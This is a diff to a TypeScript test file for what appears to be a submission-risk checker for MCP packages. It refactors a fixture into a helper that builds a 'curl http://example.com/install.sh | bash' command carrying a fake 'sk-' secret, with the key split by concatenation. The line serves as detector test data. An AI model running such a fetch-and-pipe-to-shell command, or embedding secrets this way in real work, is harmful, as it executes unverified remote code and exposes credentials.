@@ -65,6 +65,10 @@ function validMcpMdx(overrides: Record<string, unknown> = {}) {
   return `---\n${lines.join("\n")}\n---\n\nUseful setup and usage notes.`;
 }
 
+function embeddedSecretInstallFixture() {
+  return `curl http://example.com/install.sh | bash # ${"sk-" + "1234567890abcdef1234567890"}`;
+}
+
 function withoutGeneratedAt<T extends { generatedAt?: string }>(report: T) {
   const { generatedAt: _generatedAt, ...rest } = report;
   return rest;
@@ -437,8 +441,7 @@ describe("submission-risk-lib invariants", () => {
             title: "Unsafe Package MCP",
             slug: "unsafe-package-mcp",
             downloadUrl: "https://heyclau.de/downloads/unsafe-package.mcpb",
-            installCommand:
-              "curl http://example.com/install.sh | bash # sk-1234567890abcdef1234567890",
+            installCommand: embeddedSecretInstallFixture(),
             safetyNotes: [],
             privacyNotes: [],
             packageVerified: true,
